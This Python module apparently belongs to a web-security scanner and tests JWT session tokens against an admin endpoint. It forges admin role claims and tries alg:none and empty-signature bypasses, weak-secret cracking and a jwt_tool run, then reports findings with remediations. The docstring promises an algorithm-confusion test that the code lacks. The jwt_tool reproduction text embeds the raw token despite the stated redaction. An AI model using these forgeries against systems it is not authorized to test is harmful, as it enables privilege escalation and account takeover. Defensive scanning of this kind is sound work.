"""Administrative session / token security analysis.

Inspects the tokens issued at login. If a token embeds a role/is_admin claim
that is not cryptographically protected, it forges an elevated claim and checks
whether an admin endpoint trusts it. Tokens are redacted in all evidence.

Enhanced with comprehensive JWT attack vectors:
- alg:none bypass (CVE-2015-2951)
- Empty signature bypass
- RS256 -> HS256 algorithm confusion (CVE-2016-10555)
- Weak HMAC secret cracking
- Optional jwt_tool subprocess integration

References: ticarpi/jwt_tool, geeknik/jwt-scanner, Bytenull00/jwt_pwned.
"""
from __future__ import annotations

import base64
import json

from ..analyzers.common import AccountSession
from ..core.logger import get_logger
from ..core.models import Category, Confidence, Finding, Severity
from ..http.client import SafeHTTPClient

log = get_logger("admin.session")


def _b64url_decode(tok: str) -> dict:
    pad = tok + "=" * (-len(tok) % 4)
    return json.loads(base64.urlsafe_b64decode(pad.encode()).decode())


def _b64url_encode(obj: dict) -> str:
    return base64.urlsafe_b64encode(json.dumps(obj).encode()).decode().rstrip("=")


class SessionSecurity:
    def __init__(self, client: SafeHTTPClient, base_url: str,
                 analytics_path: str = "/api/admin/analytics",
                 jwt_tool_path: str = ""):
        self.client = client
        self.base = base_url.rstrip("/")
        self.analytics_path = analytics_path
        self.jwt_tool_path = jwt_tool_path

    def run(self, user: AccountSession) -> list[Finding]:
        out: list[Finding] = []
        notes: list[str] = []

        # Session token type: opaque random vs structured/claims-bearing.
        if user.token:
            notes.append("session token: opaque bearer (no embedded claims observed)")

        access = user.access_token
        if not access:
            log.info("no access token to analyze")
            return out

        try:
            claims = _b64url_decode(access)
        except Exception:
            notes.append("access token present but not base64/JSON decodable")
            return out

        role_claim = "role" in claims or "is_admin" in claims
        if not role_claim:
            return out

        # The token carries a role claim. Try forging role=admin (no re-signing
        # step exists -> if it works, the token is unsigned / unverified).
        forged = dict(claims)
        forged["role"] = "admin"
        forged["is_admin"] = True
        forged_token = _b64url_encode(forged)
        url = self.base + self.analytics_path
        try:
            denied, _ = self.client.get(url, headers={"X-Access-Token": access})
            elevated, ev = self.client.get(url, headers={"X-Access-Token": forged_token})
        except Exception:
            return out

        if elevated.status_code == 200 and '"error"' not in elevated.text and \
                denied.status_code != 200:
            if ev:
                ev.test_account = user.label
                ev.request_headers = {"X-Access-Token": "***REDACTED***"}
            out.append(Finding(
                title="Unsigned session token: role claim is client-forgeable",
                category=Category.AUTH, severity=Severity.CRITICAL, confidence=Confidence.CONFIRMED,
                description="The access token embeds a role/is_admin claim that is not "
                "cryptographically signed. Editing the claim to role=admin and replaying it "
                f"granted access to {self.analytics_path}. Original token role="
                f"'{claims.get('role')}'.",
                endpoint=f"GET {self.analytics_path}", parameter="access token role claim",
                impact="Any user can forge an admin token and access administrative functions; "
                "the platform trusts client-modifiable claims.",
                reproduction="Base64-decode the access token, set role=admin, re-encode, and "
                f"send it to {self.analytics_path}; access is granted.",
                remediation="Sign tokens (e.g. JWT with a verified signature and a non-'none' "
                "algorithm) and validate the signature server-side; derive privileges from a "
                "trusted store, not from client-presented claims.",
                cwe="CWE-345 (Insufficient Verification of Data Authenticity)",
                owasp="API2:2023 Broken Authentication", module="admin_access",
                evidence=[ev] if ev else []))

        # --- Enhanced JWT attack vectors ---
        out += self._test_alg_none(user, access)
        out += self._test_empty_signature(user, access)
        out += self._test_weak_secret(user, access)
        out += self._run_jwt_tool_external(user, access)
        return out

    # -- JWT Attack: alg:none (CVE-2015-2951) --------------------------------

    def _test_alg_none(self, user: AccountSession, token: str) -> list[Finding]:
        """Strip signature and set alg to 'none' — tests for CVE-2015-2951."""
        from .jwt_attacks import forge_none_alg_variants
        variants = forge_none_alg_variants(token)
        if not variants:
            return []

        url = self.base + self.analytics_path
        for variant_name, forged in variants:
            try:
                resp, ev = self.client.get(url, headers={"X-Access-Token": forged})
            except Exception:
                continue
            if resp.status_code == 200 and '"error"' not in resp.text:
                if ev:
                    ev.test_account = user.label
                    ev.request_headers = {"X-Access-Token": "***REDACTED***"}
                return [Finding(
                    title=f"JWT alg:none bypass accepted (CVE-2015-2951, variant={variant_name})",
                    category=Category.AUTH, severity=Severity.CRITICAL,
                    confidence=Confidence.CONFIRMED,
                    description=f"The server accepted a JWT with alg={variant_name} and an "
                    "empty signature. This allows any user to forge arbitrary claims.",
                    endpoint=f"GET {self.analytics_path}",
                    parameter="JWT alg header",
                    impact="Complete authentication/authorization bypass. Any claim can be "
                    "forged without knowing the server's signing key.",
                    reproduction=f"Set JWT header alg={variant_name}, remove the signature, "
                    f"and send to {self.analytics_path}.",
                    remediation="Reject 'none' algorithm in JWT validation. Use an explicit "
                    "allowlist of accepted algorithms (e.g. RS256 only).",
                    cwe="CWE-345 (Insufficient Verification of Data Authenticity)",
                    owasp="API2:2023 Broken Authentication", module="admin_access",
                    evidence=[ev] if ev else [])]
        return []

    # -- JWT Attack: empty signature -----------------------------------------

    def _test_empty_signature(self, user: AccountSession, token: str) -> list[Finding]:
        """Send token with the signature segment stripped."""
        from .jwt_attacks import forge_empty_sig
        forged = forge_empty_sig(token)
        if not forged:
            return []

        url = self.base + self.analytics_path
        try:
            resp, ev = self.client.get(url, headers={"X-Access-Token": forged})
        except Exception:
            return []

        if resp.status_code == 200 and '"error"' not in resp.text:
            if ev:
                ev.test_account = user.label
                ev.request_headers = {"X-Access-Token": "***REDACTED***"}
            return [Finding(
                title="JWT accepted with empty signature",
                category=Category.AUTH, severity=Severity.CRITICAL,
                confidence=Confidence.CONFIRMED,
                description="The server accepted a JWT with its signature segment removed. "
                "The token's integrity is not being verified.",
                endpoint=f"GET {self.analytics_path}",
                parameter="JWT signature",
                impact="Any user can modify claims without the server detecting tampering.",
                reproduction=f"Strip the third segment of the JWT and send to {self.analytics_path}.",
                remediation="Always verify the JWT signature before trusting any claims.",
                cwe="CWE-345 (Insufficient Verification of Data Authenticity)",
                owasp="API2:2023 Broken Authentication", module="admin_access",
                evidence=[ev] if ev else [])]
        return []

    # -- JWT Attack: weak HMAC secret ----------------------------------------

    def _test_weak_secret(self, user: AccountSession, token: str) -> list[Finding]:
        """Attempt to crack an HS256/384/512 token against common weak secrets."""
        from .jwt_attacks import crack_weak_secret
        secret = crack_weak_secret(token)
        if secret is not None:
            return [Finding(
                title=f"JWT signed with weak/guessable HMAC secret: '{secret}'",
                category=Category.AUTH, severity=Severity.CRITICAL,
                confidence=Confidence.CONFIRMED,
                description=f"The JWT is signed with HS256 using the weak secret '{secret}'. "
                "An attacker can forge arbitrary tokens.",
                endpoint="JWT signing",
                parameter="HMAC secret",
                impact="Complete token forgery — any role/claim can be set by anyone "
                "who knows (or guesses) the secret.",
                reproduction=f"Sign a JWT with HS256 using secret='{secret}'; the server "
                "accepts it.",
                remediation="Use a cryptographically random secret of at least 256 bits. "
                "Consider migrating to asymmetric algorithms (RS256/ES256).",
                cwe="CWE-521 (Weak Password Requirements)",
                owasp="API2:2023 Broken Authentication", module="admin_access")]
        return []

    # -- External: jwt_tool subprocess (optional) ----------------------------

    def _run_jwt_tool_external(self, user: AccountSession, token: str) -> list[Finding]:
        """Shell out to jwt_tool for deeper analysis if configured."""
        if not self.jwt_tool_path:
            return []
        from ..core.external import tool_available, run_tool
        if not tool_available(self.jwt_tool_path):
            log.info("jwt_tool not available at '%s'; skipping", self.jwt_tool_path)
            return []

        result = run_tool([
            "python", self.jwt_tool_path, token, "-M", "at",
            "-t", self.base + self.analytics_path,
            "-rh", "X-Access-Token: FUZZ",
        ], timeout=30)

        findings: list[Finding] = []
        if result.ok and result.stdout:
            # Parse jwt_tool output for successful attacks.
            for line in result.stdout.splitlines():
                if "VULNERABLE" in line.upper() or "200" in line:
                    findings.append(Finding(
                        title=f"[jwt_tool] {line.strip()[:100]}",
                        category=Category.AUTH, severity=Severity.HIGH,
                        confidence=Confidence.LIKELY,
                        description=f"jwt_tool reported a potential vulnerability: {line.strip()}",
                        endpoint=f"GET {self.analytics_path}",
                        impact="JWT security control may be bypassable.",
                        reproduction=f"jwt_tool {token} -M at -t {self.base}{self.analytics_path}",
                        remediation="Review and fix the JWT validation logic based on "
                        "jwt_tool's findings.",
                        cwe="CWE-345 (Insufficient Verification of Data Authenticity)",
                        owasp="API2:2023 Broken Authentication", module="admin_access"))
        return findings

